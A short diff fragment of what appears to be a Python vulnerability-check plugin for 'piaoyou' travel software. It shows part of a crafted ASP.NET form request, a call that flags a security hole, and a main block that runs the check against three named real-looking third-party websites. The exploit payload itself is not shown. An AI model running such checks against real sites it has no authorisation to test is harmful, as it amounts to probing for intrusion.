@@ -105,7 +105,7 @@ __VIEWSTATE='''+urllib.parse.quote(view[0])+'''&__EVENTVALIDATION='''+urllib.par
             security_hole(target)
 
 if __name__ == '__main__':
-    from dummy import *
+
     audit(assign('piaoyou', 'http://www.h-h.com.cn/')[1])
     audit(assign('piaoyou', 'http://oa.ryxtrip.com/')[1]) 
     audit(assign('piaoyou', 'http://oa.cht-travel.com/')[1])     
